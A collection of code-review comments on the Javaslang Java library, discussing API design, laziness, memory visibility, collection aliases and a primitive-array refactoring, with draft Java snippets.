:)\n. (Aksing myself if there is a chance that computeValue() is inlined by JIT. What happens then with the short get()? Will it be still inlined by Git?)\n. Ok\n. @ashrko619 @ruslansennov Please let us stay with Seq instead of Iterator. Then the static sequence() methods of all Value implementations have the same signature.\nAlso let's narrow the return type generics. I've learned that Iterable<? extends Tuple....> also comes handy in certain situations (see this comment).\nI agree that it could make sense to have a lazy implementation underneath, so let's take Stream, like Future.sequence does.\nThe result looks like this:\njava\nstatic <T1, T2> Tuple2<Seq<T1>, Seq<T2>> sequence2(Iterable<? extends Tuple2<? extends T1, ? extends T2>> tuples) {\n    return new Tuple2<>(\n            Iterator.ofAll(tuples).map(Tuple2::_1).toStream(),\n            Iterator.ofAll(tuples).map(Tuple2::_2).toStream());\n}\nIf possible, the generator should create the new lines like above for Tuple2, Tuple3, ...\nFor Tuple1 it can still be a one-liner:\njava\nreturn new Tuple1<>(Iterator.ofAll(tuples).map(Tuple1::_1).toStream());\n. @paplorinc when I understood @shipilev right, the non-volatile read of value\njava\nif (value == null && ...)\ndoes not guarantee that (in the case of value != null) the second read does evaluate the same value:\njava\nreturn value;\nIn other words your version is not deterministic and may produce unexpected results.\nAm I right right?\n. @shipilev In our case that might be ok. We first read value because it is a fast read. We can have three cases then.\n1. value was not written by any thread yet\n2. read reflects the written value, i.e. it is visible to the thread.\n3. written value is not visible to the current thread\nIn case 1. value is null and will be computed. After that it is visible to the current thread and will be returned by get().\nIn the second case the write to value is visible. Then we are finished and can safely return it.\nIn the third case the write to value is not visible, it seems to be still null. Then supplier is read and it turns out that we already computed the value. Because of the volatile read of supplier our value is now \u2728automagically\u2728 visible to the current thread and it can be safely returned by get().\nIn other words we use value == null as a shortcut and we can detect not-visible writes by having the volatile 'afterburner' read of supplier.\nBenchmarks say that is faster in most cases.\n. @shipilev thanks for clarifying it again and for being so patient with us \ud83d\ude4f\ud83c\udffc\nThe missing part we did not consider was the one with the transitive dependencies.\n@paplorinc please follow then this solution. Further improvements can be made later if necessary. I want this get merged to add it to the upcoming 2.0.4.\n. we can remove this.\n. I agree. It will be a little less ugly if we add T[] Value.toJavaArray(T[]) - the only safe solution :-/\nSee #1582 \n. Please narrow the streams:\njava\nStream.narrow(Iterator.ofAll(...)...toStream());\n. Double-checked it - should work!\njava\n    static <T1, T2> Tuple2<Seq<T1>, Seq<T2>> sequence2(Iterable<? extends Tuple2<? extends T1, ? extends T2>> tuples) {\n        return new Tuple2<>(\n                Stream.narrow(Iterator.ofAll(tuples).map(Tuple2::_1).toStream()),\n                Stream.narrow(Iterator.ofAll(tuples).map(Tuple2::_2).toStream()));\n    }\n. Yes! That is a better solution :)\n@ashrko619 please do it like @paplorinc suggests\n. Preferences on the semantic ordering of methods may vary - depending of the person who is looking at the code.\nI try to keep alphabetic ordering (which is, however, not continuously applied yet).\nA (more or less) precise specification on which order we prefer you find in the file CONTRIBUTION.md (section 'File structure').\n\nSide-note: Regarding  append and prepend I have come to a conclusion: we will remove them again. The builder should not be baked into the tuple itself. Also we block the evolution of Tuple (e.g. increasing the max number of tuples) by letting Tuple8.append/prepend throw.\n@ashrko619 please don't feal \ud83d\ude22 about it (removing append/prepend again). It is hard to make correct API decisions. I will try to do deeper investigations before you create a PR next time!\n. Note: We remove append/prepend in another PR.\n. It does not matter any more - append/prepend will be removed.\n. > I still don't think it's a good idea to throw here :/\nRight, we will remove it...\n. This is ok!!!\nPlease don't revert...\n. There is one more thing I saw by looking at the code. \ud83d\ude48 Stream is persistent, so the tuples can be reused like this:\njava\nfinal Stream<Tuple3<T1, T2, T3>> s = Stream.ofAll(tuples);\nreturn new Tuple3<>(s.map(Tuple3::_1),\n                    s.map(Tuple3::_2),\n                    s.map(Tuple3::_3));\nCould you please adjust the generator accordingly? \ud83d\ude4f\ud83c\udffd\u263a\ufe0f\n. Yes, you are right!\n. Yup!\n. Yes, right! (I didn't like the name 'timeout' of JavaScript because it intends to cancel the computation after a specific amount of time.)\nDelay is much better than duration.\n. @hepin1989 Thanks! I'm not used to HashWheelTimers. Our Future impl has no 'execution queue'. How could an impl look like?\nProject Reactor's HashWheelTimer also supports Sleep:\nhttps://projectreactor.io/old/api/reactor/fn/timer/HashWheelTimer.SleepWait.html\nAs an alternative there are Spin strategies that loop. These are costly (a whole core in a multicore environment). I think spinning a loop is no viable solution.\nThe sleep we use takes place on a different thread (if the executor-service isn't trivial). So it doesn't hurt much.\n\nBut I think there is something we didn't realize yet: We should take the time when the run method is entered. Because it may happen, that the wait is already over because the ExecutorService needed some time to spawn a new thread. Even if the time isn't over, we only need to wait the remaining delta since the run method was entered. This will be ~~much~~ more precise.\nThanks for the hint :)\n. @hepin1989 Thank you for the hints! Looking at Java's Future API I think the API of this PR has to be slightly changed. We should also use TimeUnit instead of fixating it to milliseconds.\nJava has the ScheduledExecutorService to schedule jobs. We could leverage it but we need to ensure that the execution of the computation takes place on a Thread emitted by the underlying ExecutorService of the Future.\nI will take my time to get it right before merging this PR!\n\njavaslang is great,we are using it at taobao\ud83d\ude03\n\nWow, you have 39.9 million users, right?\n. @hepin1989 which features of Javaslang do you use mainly?\nAre you interested in a guest blog-post about how you use Javaslang? I.e. on the Javaslang Blog\n. Update: Netty also uses Java's ScheduledExecutorService under the hood: https://netty.io/4.0/api/io/netty/util/concurrent/EventExecutorGroup.html#schedule(java.util.concurrent.Callable,%20long,%20java.util.concurrent.TimeUnit)\nThat is the way to go.\n. If name is denoted in camel case, we should only convert the first character to lower case (in general), but for now this should work also - otherwise the compiler would complain...\n. Likewise to Scala\n- option(null) should be None\n- some(null) should be Some(null)\n. > I think we could/should have a general Object static factory here also/instead.\nNot here. These are only aliases. The factory methods / the functionality reside in the Value implementations.\nFor now I see no need to add additional factory methods. The user can decide how to convert an object to a String. The purpose of CharSeq is to enrich a String by being a Wrapper with manifold methods.\n. We (will) have conversion methods toHashMap() instead of toMap(), etc.\nBut the aliases in fact should be the simple names, e.g.\n- Map instead of hashMap\n- SortedMap instead of TreeMap\n- ...\n. The semantics are checked in OptionTest.\nHere we should check if the aliases work right. E.g.\n- assertThat(Option(1)).isEqualTo(Option.of(1));\n- assertThat(Some(1)).isEqualTo(Option.some(1));\n- assertThat(None()).isEqualTo(Option.none());\nBonus points:\n- `assertThat(Option(null)).isEqualTo(Option.of(null));\n(I used first-upper case methods here because it might be our API, but before changing it let me investigate my idea further of letting value types implement Pattern*)\n. Stay tuned. I'm analyzing to integrate Pattern into the Value type hierarchy. Then we will get Values that are decomposable out of the box (by having an unapply method). Such a change can still be backward compatible I think...\n. We take the simple variants. More specifically we name the methods:\njava\n* Set, SortedSet, LinkedSet\n* Map, SortedMap, LinkedMap\nWe should also add aliases\njava\n* Seq - which defaults to List (=> LinearSeq is not needed)\n* IndexedSeq - which defaults to Vector\n...likewise to Scala:\n``` scala\nscala> Seq(1, 2, 3)\nres0: Seq[Int] = List(1, 2, 3)\nscala> IndexedSeq(1, 2, 3)\nres1: IndexedSeq[Int] = Vector(1, 2, 3)\nscala> LinearSeq(1, 2, 3)\n:11: error: not found: value LinearSeq\n       LinearSeq(1, 2, 3)\n       ^\n```\n. Yes, but Netty does not implement the timeout/delay functionality at the core using delayed task queues.\nIt looks like to me that Netty uses a ScheduledExecutorService to produce a ScheduledFuture (like I stated above).\nThese ScheduledFutures are put on a PriorityQueue to ensure that the next delay that expires will be taken in to account. (The underlying java.util.PriorityQueue does take the natural order of elements into account. The java.util.concurrent.ScheduledFuture does extend Comparable<Delayed>, by which is ensured that the smaller delays are ordered first.)\nQuestion: How uses Netty the PriorityQueue? What is it needed for? The ScheduledFuture will run after a specific delay, regardless if it is put on a queue or not.\nNeed to take a look at the source code of Netty. But my 'feeling' says, for now we don't need to put our futures on a PriorityQueue!\nHowever, it could be useful to let Javaslang's Future implement Comparable<java.uti.concurrent.Delayed>, where the default delay is 0 (for non-delayed Futures).\n. There exists no such think as function equality (in limited time/mem). Two functions f1: T -> R and f2: T -> R are equal, if\n1. f1(t) is defined if and only if f2(t) is defined for all t &in T\n2. f1(t) is defined => f1(t) == f2(t), for all t &in T\nI think isNotNull is the best we can do here.\n. We already have Value.toJavaStream(). But maybe we will integrate better with Java by deprecating it and adding Value.stream() and Value.parallelStream() :-)\n. Yes. We could also stay with toJavaStream() and add toJavaParallelStream().\n. We called t._1.equals(...) where t._1 potentially could be null.\n. dito\n. in OptionTest the actual and expected values were confused in multiple assertions\n. There was some discussion about Option.nothing() and I think you also mentioned it.\nLet's leave it away for now. We can add it later if really needed. (If we add it we can't get rid of it any more without breaking backward compatibility.)\n. This looks really great! When reading this file I can't wait to get my hands on the new API :-))\nPlease add also all empty collection methods:\n- List(), Set(), Map(), ...\n. For me this is ok. When this PR is pulled I will get my hands dirty and add more tests.\nExample:\njava\nassertThat(Valid(1)).isEqualTo(Validation.valid(1));\n. You're right. Could you please create an issue?\n. Yes that would be nice!\n. Multimaps: Not now, maybe in another PR. They are created with a builder, not with a single constructor or factory method. We need to think about it. Maybe it makes not sense at all...\n. For one str concatenation an interpolated String looks like too much overhead. I would not do it... But the question is valid.\n. Please also run mvn javadoc:javadoc. It runs the javadoc linter of the jdk...\n. @ashrko619: Yes @paplorinc is right. Let's stay with List.ofAll() in this line.\n. @ashrko619 @paplorinc In this case we should keep the original code (Seq<U>) iterator().flatMap(mapper).toStream().\nThe first iterator() call creates one mutable Iterator instance. Iterator.flatMap is very efficient. It continuously calls the mapper to obtain a new internal Iterator and iterates over these elements. Finally toStream wraps the Iterator and produces new Stream.Cons instances on access.\nThe solution Stream.ofAll(iterator).flatMap() creates Stream.Cons instances two times (instead of only one time as above). The first time for every element of the original Iterator when accessed. The second time for every element of the flatMap result.\nSo the original solution is better (O(n + c) instead of O(2 * n + c) memory efficiency)\n. Please keep the original solution, same reason as above.\n. The Collections.scanLeft method is not lazy. In our case it pre-calculates the whole Stream. Please use this instead:\njava\nreturn iterator().scanLeft(zero, operation).toStream();\n. Off-topic: I think we should re-implement Collections.scanLeft / Collections.scanRight in another PR (see #1610) and call iterator().scanLet/Right(zero, operation).toXxx() instead:\n``` java\nclass Collections {\n    static > R scanLeft(Traversable<? extends T> traversable,\n            U zero, BiFunction<? super U, ? super T, ? extends U> operation, Function, R> finisher) {\n    final Iterator<U> iterator = traversable.iterator().scanLeft(zero, operation);\n    return finisher.apply(iterator);\n}\n\n}\n```\nCall site example:\njava\nCollections.scanLeft(this, zero, operation, Iterator::toVector)\n. foldLeft is not lazy, please implement it like this:\njava\n    default <U> Seq<U> traverse(BiFunction<K, V, ? extends U> mapper) {\n        Objects.requireNonNull(mapper, \"mapper is null\");\n        return iterator().<U> map(entry -> mapper.apply(entry._1, entry._2)).toStream();\n    }\n. Nope :) The original expression return (Seq<U>) iterator().map(mapper).toStream(); saves n Stream.Cons instances compared to the suggested solution.\n. Also here: return (Seq<U>) iterator().flatMap(mapper).toStream(); is already the best we can do!\n. Dito: stay with the original impl\n. @ashrko619 The sequence operation isn't lazy by nature. We have to evaluate all contained elements to decide whether the result is empty or not. Therefore we should choose an eager Seq implementation. Namely either we stay with List (because of good memory footprint) or choose Vector (because we safe the reverse operation).\nI tend to use Vector.\n\n@paplorinc It is the 'algebraic' definition of sequence:\njava\nsequence(Seq[M[T]]) =::= M[Seq[T]]\nThe sequence operation on a Value (resp. Monad) reflects the properties of a Functor (first failing operation => empty result) in contrast to an Applicative (subsequent results are collected).\n. Yes, please remain List here.\n. Please add a @return this Future instance to the Javadoc and test it with mvn javadoc:javadoc. We need to eliminate all doclint warnings, otherwise a release fails next time.\n. It is ok for me as-is. I recently did a few changes to the formatter regarding indentation. I will apply the new rules to the whole code-base soon, so this space actually does not matter.\nThank you!\n. Yes, I think for now we only need a package-private Sets class (similar to Maps), which contains one method:\njava\nstatic boolean equals(Set<?> self, Object o) {\n    if (o == self) {\n        return true;\n    } else if (o instanceof Set) {\n        final Set<?> that = (Set<?>) that;\n        return self.forAll(that::contains); // PROBLEM: SEE BELOW\n    } else {\n        return false;\n    }\n}\nThe Set interface needs to @Override the equals method. This should contain some javadoc about Set equality (all Set impls share the same equals method).\nAll Set implementations need to override the equals method like this:\njava\n@Override\npublic boolean equals(Object o) {\n    return Sets.equals(this, o);\n}\nWe only have one problem to solve in order to make the code above work: contains() currently takes a T instead of an Object. Maybe we need to change the signature of Set#contains...\n. You are right, then please leave it for now. It will be possible when we add typed HashMap.of() methods. @ruslansennov is on it but it will still take some time before we can use them... (See #1608)\n. We should not rely on 3rd party libs.\n. On the one hand yes - on the other hand modifications to persistent collections return always a new instance. It is inserted into this map by implicitly creating a new version. Hard to describe.\nI would leave it this way. It would be redundant to describe it every time. Instead we could update the src/main/java/javaslang/collection/package-info.java and add a little section about this topic. I can do that!\n. Will do a complete review later today. Really looking forward to pulling this change in :-)\n. Chances are good that we will migrate to maven soon.\nStefan Oehme (Gradle GmbH) lives also in Kiel, he offered me to help us.\n. Hahaha, of course I meant s/maven/gradle/\n. \n. yep, as @valery1707 said we need Object instead of K and V in the link...\n. good!\n. We should start from 1 for all $mapType's and remove the existing code the the *Map(K, V)-case.\n. No errors here... Which version do you use? I have Java 1.8.0_101.\nThe following code does work:\n``` java\npublic class Test {\npublic static void main(String[] args) {\n\n    // TreeMap((1, a), (2, b), (3, c), (4, d), (5, e), (6, f), (7, g), (8, h), (9, i), (10, j))\n    final Map<Integer, String> map = TreeMap.of(Integer::compareTo,\n            1, \"a\",\n            2, \"b\",\n            3, \"c\",\n            4, \"d\",\n            5, \"e\",\n            6, \"f\",\n            7, \"g\",\n            8, \"h\",\n            9, \"i\",\n            10, \"j\"\n            );\n\n    // TreeMap((1, a), (2, b), (3, c), (4, d), (5, e), (6, f), (7, g), (8, h), (9, i), (10, j))\n    System.out.println(map);\n\n}\n\n}\n```\nI tend to keep the method and add a unit test in TreeMapTest. If the CI build is ok, we can keep it.\n. you fox, nice trick :)\n. @ruslansennov The example above still works for me. My TreeMap now has these methods (beside all others):\n``` java\npublic static , V> TreeMap of(Object... pairs) { ... }\npublic static  TreeMap of(Comparator<? super K> keyComparator, Object... pairs) { ... }\npublic static , V> TreeMap of(K key, V value) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4, K k5, V v5) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4, K k5, V v5, K k6, V v6) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4, K k5, V v5, K k6, V v6, K k7, V v7) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4, K k5, V v5, K k6, V v6, K k7, V v7, K k8, V v8) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4, K k5, V v5, K k6, V v6, K k7, V v7, K k8, V v8, K k9, V v9) { ... }\npublic static , V> TreeMap of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4, K k5, V v5, K k6, V v6, K k7, V v7, K k8, V v8, K k9, V v9, K k10, V v10) { ... }\n```\nLet's restore the old method that causes problems, maybe plus an additional unit test that fails to compile on your machine, and start a CI build on travis-ci. I will also check the branch out to see, if it causes problems on my local machine.\nNote: Removing the method should be our last resort because it will break backward-compatibility.\n. @ruslansennov I forgot to mention the other methods. My test still works locally, also with objects only / without explicit comparator.\n\n. Yes, good catch! Thought there are already test - have to check them again...\n. Multimap does need similar overrides, I will add them, too.\nAlso the coverage decreased. I will take care of it.\n. will change it\n. it is fine as is!\n. Huh, where does this ')' come from? Does it really compile!?\n. > Comparable?\nThe tests use IntMap<T> which extends Traversable<T>. We need to extends Map in order to test the overrides.\nHowever, currently we need IntMap because our AbstractMapTest extends the AbstractTraversableTest and otherwise the method overrides do not compile.\nI will search for another solution.\nThis PR: simple change, big impact o_O\n. nice finding!\n. At least there are chances that it will be fixed near-time. Our GWT dependency is still an RC (release candidate).\n. It seems to be a Java bug. Hopefully it will be fixed until Java 9. There is still hope.\n. @paplorinc I've slept over the topic. What about generating the converters for every primitive type?\nI would rename LeafType to PrimitiveArray and let IntArray, CharArray, ... extend it. All these types reside in a package-private final class Arrays.\nI think we could reuse these types also in other collections, starting with Array :)\n. @paplorinc for now I see no reason to do that. the types should be package-private available for collection for now. Arrays are somehow collections. It is sufficient if our Javaslang collections use the primitive arrays. Our Array will abstract over all of the primitve + object arrays. It is a sell-point for our Array to not give them to the outside.\n. Btw - I plan to re-engineer/split the code generator in a near future. It will split into:\n- GeneratorCore.scala\n- GeneratorJava.scala (depends on GeneratorCore)\nAnd a separate generator for each task (which depend on GeneratorJava), e.g.\n- TupleGenerator.scala\n- FunctionGenerator.scala\n- ...\nOur Generator currently gets bigger and bigger. Maven can only run Scala scripts (without imports) before the compile-phase. I hope that Gradle will make it possible to split our Generator.scala.\n. This will compile Java 9 binaries, I think it should stay 1.8. Only the JDK used to compile has to change, right?\n. @paplorinc is also a fox - just saying that we have Java-trickery experts here :)\n. @ashrko619 looks like it has to be Stream.empty(). Do you have a pointer to the test (File/Line number)?\n. No, I will remove it. What counts is the current state of the application, it reflects the truth. The less organizational overhead, the better. Commits to a file are browsable. Also the full-text search function for issues and PRs is great. Thank you for asking!\n. Will check it. had problems with (1,1,2,2,1,1).span(i -> i == 1). unordered and sorted collections tests failed...\nSo I used (1,1,2,2,3,3).span(i -> i % 2 == 1) instead.\nThese tests should fail with unmodified Iterator class!\n. From what I can see the concat(this) will not work. We need to concat the remaining elements after t.\n. Right - forgot that we are mutably stateful. However, the other is more efficient.\n. But having a simple solution would be also nice. I will think about it.\n. Instead of empty() also this could be returned...\n. > Feel free to benchmark it :)\nGenerally yes :) But I think I need to be the pragmatic developer in this case. Otherwise we will never see 2.1.0. My plan is to resolve 68 issues (tendency increasing because of new tickets). Every day an issue => two months.\nEvery 3 days an issue => half a year...\nBut yes, quality is very important!!\n. > would that == the empty() instance?\nMmhh, you're right. We need to empty()!\n. @paplorinc For now we follow the stateful design and low-level implementation of Scala's Iterator. See https://github.com/scala/scala/blob/2.12.x/src/library/scala/collection/Iterator.scala#L794-L823\n. Thank you for your investigation. Let's keep the code for now.\n. I think my solution can be made faster - I will try... (but currently busy with the Gradle online course)\n. This is still not lazy, the foldLeft will iterator over all elements. We need to do the following:\njava\nreturn iterator().map(entry -> mapper.apply(entry._1, entry._2)).toStream();\n. Could be implement more efficient like this (same as in Map above):\njava\nreturn iterator().scanLeft(zero, operation).toStream();\n. Please use Vector.ofAll() instead of Stream.ofAll(). See an explanation below (at the Option.sequence() change).\n. I've double-checked all Javaslang types. Future, Lazy, Option, Validation and Try have a sequence() method. We should take care that all sequence() methods return the same. That is not always possible (as described below) but the others should use Vector instead of List now.\n- [x] Future.sequence() can stay as-is. It uses Stream in order to defer the blocking call of Future.get()\n- [x] Option.sequence() uses Vector now instead of List\n- [x] Lazy.sequence() needs to use Vector (instead of List or Stream)\n- [x] Try.sequence() needs to use Vector instead of List\n- [x] ~~Validation.sequence() needs to use Vector instead of List~~\n- [ ] Map.scanLeft(), Map.scanRight() need to use Vector instead of Stream\nPlease use Vector for the sequence() methods of Lazy, Validation and Try.\n. minor: indentation (one space too much before '*')\n. minor: indentation\n. minor: please remove this import and use Function.identity() instead (Function is already imported and we do not need special Function1 features)\n. Could we create a method to replace this idiom of copying the BMT?\njava\nprivate BitMappedTrie<T> boxed() { return map(Function.identity()); }\n. The usages of obj() / the casts are unnecessary here because the target type is Object.\nWe should use ObjectArrayType.INSTANCE instead.\n\nNote: When reading the code I wondered why we use obj() here directly. Can't the values be of primitive type?\n. Please change the if-statements like this:\njava\nif (!type.isPrimitive()) {\n    return (ArrayType<T>) ObjectArrayType.INSTANCE;\n} else if (boolean.class == type) {\n    return (ArrayType<T>) BooleanArrayType.INSTANCE;\n} else if (byte.class == type) {\n    return (ArrayType<T>) ByteArrayType.INSTANCE;\n} else if (char.class == type) {\n    return (ArrayType<T>) CharArrayType.INSTANCE;\n} else if (double.class == type) {\n    return (ArrayType<T>) DoubleArrayType.INSTANCE;\n} else if (float.class == type) {\n    return (ArrayType<T>) FloatArrayType.INSTANCE;\n} else if (int.class == type) {\n    return (ArrayType<T>) IntArrayType.INSTANCE;\n} else if (long.class == type) {\n    return (ArrayType<T>) LongArrayType.INSTANCE;\n} else if (short.class == type) {\n    return (ArrayType<T>) ShortArrayType.INSTANCE;\n} else {\n    throw new IllegalArgumentException(\"Unknown type: \" + type);\n}\n. We should not use (or even know about) obj() here (in BMT) at all. Instead use a static import of the ObjectArrayType methods getAt and setAt and use those here. We do not need the cast to ArrayType<T> because we deal with Object here.\n(If we can't statically import them, we should use the qualified call ObjectArrayType.getAt...)\n\nBut it is still not clear to me why we are using ObjectArrayType directly. Can't the values be primitive?\n. Please rename type to arrayType. It was not obvious to me...\n. java\nfinal Object previous = obj().getAt(array, previousIndex);\nfinal Object newLeaf = leaf.apply(previous, offset);\n/*ObjectArrayType.*/setAt(array, previousIndex, newLeaf);\n*) is the name newLeaf correct?\n. Should be removed completely. Only use is in BMT.cannotAdd. See my comment there.\n. Only use in asPrimitive(Class). Can be removed too.\n. we need to remove this assert please - it is the only remaing line that uses the code below that should be removed\n. both constants can be removed\n. We don't need to check the types. Because we already use T we only need to check if we want to insert null into a primitive array.\njava\nprivate boolean addNullToPrimitiveArray(T element) { return !arrayType.isPrimitive() && element == null; }\nI don't think we need an additional check if the element is an Object and we want to insert it into an primitive array. If the element is not null it should be unboxed, right?\nIf it is not unboxed we have to:\njava\nprivate boolean addNullOrObjectToPrimitiveArray(T element) {\n    return arrayType.isPrimitive() && (element == null || !arrayType.isPrimitive());\n}\n. I would love to see one Array abstraction on the file system, e.g. ArrayType and have the implementations as auxiliary classes. The ArrayType then needs to be added to the generator.\nBut I suggested below to call ObjectArrayType.xxx directly instead of using obj(). Maybe we need to call obj() then. Or do you have another suggestion?\n. We create a Seq to get the size. That's a waste (of mem and cpu/gc) because several new objects are created. Instead I would create two times an iterator(), the first for counting, the second for getting the elements:\njava\nint size = 0;\nfor (Iterator<?> iter = iterable.iterator(); iter.hasNext(); iter.next()) { size += 1; }\nfinal Object[] array = asArray(iterable.iterator(), size);\nAdditionally we could also do an extra check for Traversable:\njava\n} else if (iterable instanceof Traversable<?>) {\n    final Traverable<T> traversable = (Traversable<T>) iterable;\n    final Object[] array = asArray(traversable.iterator(), traversable.size());\n    return ofAll(BitMappedTrie.ofAll(array));\n} ...\n. good!\n. good!\n. good!\n. +1\n. Right - but do it. The problem of consumption also occurs in other places, e.g. when an TraversableOnce is used in a For loop etc. It is a known design-error of the type hierarchy that will be fixed with 3.0.\n. You're right, of course setAt is not static.\n. Mmhh, I see ArrayType<T>, not T:\njava\nprivate static <T> BitMappedTrie<T> collapsed(ArrayType<T> type, ...\nand the constructor which is called looks like this:\njava\n    private BitMappedTrie(ArrayType<T> arrayType, Object array, int offset, int length, int depthShift) {\n        this.arrayType = arrayType;\nTherefore I would name it arrayType.\n. Would either name all ArrayType related variables/parameters throughout this class type or arrayType. Your choice.\n. I'm still thinking benchmarks should not run along with our unit tests.\nIf we need to test the correctness of our types/methods there should exist unit tests. The benchmark have a different purpose. Changing these values in order to make the tests run faster is wrong in my opinion. Benchmarks should measure all relevant scenarios, regardless how long they run. Otherwise they fail to reach their real goal.\nTo speed up the tests we should\n1. Run benchmarks on their own maven profile again.\n2. Throw out or rewrite the brute-force Vector property tests. It is too much. We need to distill the relevant business cases and write proper unit tests instead. Most other tests run ms these property tests run many seconds.\n3. Pull out the tests of the gwt example. This should also run separately.\nI would love to see benchmarks and the gwt example run in their own CI builds, each triggered by a previous (successful) Javaslang build.\n. Please change the ArrayType like follows (example for int only). We make the following changes:\n- also generate ArrayType\n- make ArrayType an interface\n- ArrayType should not extends Serializable. We've done this for other Javaslang types also - only impls implement Serializable (exception: some collections interfaces extends Function1 and are therefore Serializable)\n- make the ArrayType impls static nested classes.\nAlso I suggest to rename type() to componentType() (see TODO below).\n``` java\n/     / _  _    _   __  / \\   _\n *    /  /    \\/ \\  / \\/    \\ /  /_\\/  //    \\/  \\  //  /_\\   J\u039bV\u039bSL\u039bNG\n *  /  /  /\\  \\  \\/  /  /\\  \\\\  \\  //  /\\  \\ /\\/ \\ /\\ \\   Copyright 2014-2016 Javaslang, http://javaslang.io\n * //_/  _/_/_/  _/_\\/__/__/  _//  __/_____/   Licensed under the Apache License, Version 2.0\n /\npackage javaslang.collection;\nimport javaslang.collection.*;\nimport java.io.Serializable;\ninterface ArrayType {\n@SuppressWarnings(\"unchecked\")\nstatic <T> ArrayType<T> obj() { return (ArrayType<T>) ObjectArrayType.INSTANCE; }\n\n@SuppressWarnings(\"unchecked\")\nstatic <T> ArrayType<T> of(Object array) {\n    final Class<?> type = array.getClass().getComponentType();\n    if (!type.isPrimitive()) {\n        return obj();\n    } else if (boolean.class == type) {\n        return (ArrayType<T>) BooleanArrayType.INSTANCE;\n    } else if (byte.class == type) {\n        return (ArrayType<T>) ByteArrayType.INSTANCE;\n    } else if (char.class == type) {\n        return (ArrayType<T>) CharArrayType.INSTANCE;\n    } else if (double.class == type) {\n        return (ArrayType<T>) DoubleArrayType.INSTANCE;\n    } else if (float.class == type) {\n        return (ArrayType<T>) FloatArrayType.INSTANCE;\n    } else if (int.class == type) {\n        return (ArrayType<T>) IntArrayType.INSTANCE;\n    } else if (long.class == type) {\n        return (ArrayType<T>) LongArrayType.INSTANCE;\n    } else if (short.class == type) {\n        return (ArrayType<T>) ShortArrayType.INSTANCE;\n    } else {\n        throw new IllegalArgumentException(\"Unknown type: \" + type);\n    }\n}\n\nClass<T> type(); // TODO: rename to componentType\nint lengthOf(Object array);\nT getAt(Object array, int index);\n\nObject empty();\nvoid setAt(Object array, int index, Object value);\nObject copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size);\n\ndefault Object newInstance(int length) { return copy(empty(), length); }\n\n/** System.arrayCopy with same source and destination */\ndefault Object copyRange(Object array, int from, int to) {\n    final int length = to - from;\n    return copy(array, length, from, 0, length);\n}\n\n/** Repeatedly group an array into equal sized sub-trees */\ndefault Object grouped(Object array, int groupSize) {\n    final int arrayLength = lengthOf(array);\n    assert arrayLength > groupSize;\n    final Object results = obj().newInstance(1 + ((arrayLength - 1) / groupSize));\n    obj().setAt(results, 0, copyRange(array, 0, groupSize));\n\n    for (int start = groupSize, i = 1; start < arrayLength; i++) {\n        final int nextLength = Math.min(groupSize, arrayLength - (i * groupSize));\n        obj().setAt(results, i, copyRange(array, start, start + nextLength));\n        start += nextLength;\n    }\n\n    return results;\n}\n\n/** clone the source and set the value at the given position */\ndefault Object copyUpdate(Object array, int index, T element) {\n    final Object copy = copy(array, index + 1);\n    setAt(copy, index, element);\n    return copy;\n}\n\ndefault Object copy(Object array, int minLength) {\n    final int arrayLength = lengthOf(array);\n    final int length = Math.max(arrayLength, minLength);\n    return copy(array, length, 0, 0, arrayLength);\n}\n\n/** clone the source and keep everything after the index (pre-padding the values with null) */\ndefault Object copyDrop(Object array, int index) {\n    final int length = lengthOf(array);\n    return copy(array, length, index, index, length - index);\n}\n\n/** clone the source and keep everything before and including the index */\ndefault Object copyTake(Object array, int lastIndex) {\n    return copyRange(array, 0, lastIndex + 1);\n}\n\n/** Create a single element array */\ndefault Object asArray(T element) {\n    final Object result = newInstance(1);\n    setAt(result, 0, element);\n    return result;\n}\n\n/** Store the content of an iterable in an array */\nstatic Object[] asArray(java.util.Iterator<?> it, int length) {\n    final Object[] array = new Object[length];\n    for (int i = 0; i < length; i++) {\n        array[i] = it.next();\n    }\n    return array;\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T> T asPrimitives(Class<?> primitiveClass, Iterable<?> values) {\n    final Object[] array = Array.ofAll(values).toJavaArray();\n    assert (array.length == 0) || (primitiveClass == primitiveType(array[0])) && !primitiveClass.isArray();\n    final ArrayType<T> type = of((Class<T>) primitiveClass);\n    final Object results = type.newInstance(array.length);\n    for (int i = 0; i < array.length; i++) {\n        type.setAt(results, i, array[i]);\n    }\n    return (T) results;\n}\n\nstatic <T> Class<?> primitiveType(T element) {\n    final Class<?> wrapper = (element == null) ? Object.class : element.getClass();\n    if (wrapper == Boolean.class) {\n        return boolean.class;\n    } else if (wrapper == Byte.class) {\n        return byte.class;\n    } else if (wrapper == Character.class) {\n        return char.class;\n    } else if (wrapper == Double.class) {\n        return double.class;\n    } else if (wrapper == Float.class) {\n        return float.class;\n    } else if (wrapper == Integer.class) {\n        return int.class;\n    } else if (wrapper == Long.class) {\n        return long.class;\n    } else if (wrapper == Short.class) {\n        return short.class;\n    } else {\n        return wrapper;\n    }\n}\n\nfinal class IntArrayType implements ArrayType<Integer>, Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    private static final IntArrayType INSTANCE = new IntArrayType();\n    private static final int[] EMPTY = new int[0];\n\n    private static int[] cast(Object array) { return (int[]) array; }\n\n    @Override\n    public Class<Integer> type() { return int.class; }\n\n    @Override\n    public int[] empty() { return EMPTY; }\n\n    @Override\n    public int lengthOf(Object array) { return (array == null) ? 0 : cast(array).length; }\n\n    @Override\n    public Integer getAt(Object array, int index) { return cast(array)[index]; }\n\n    @Override\n    public void setAt(Object array, int index, Object value) { cast(array)[index] = (Integer) value; }\n\n    @Override\n    public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {\n        if (size == 0) {\n            return new int[arraySize];\n        } else {\n            final int[] result = new int[arraySize];\n            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the 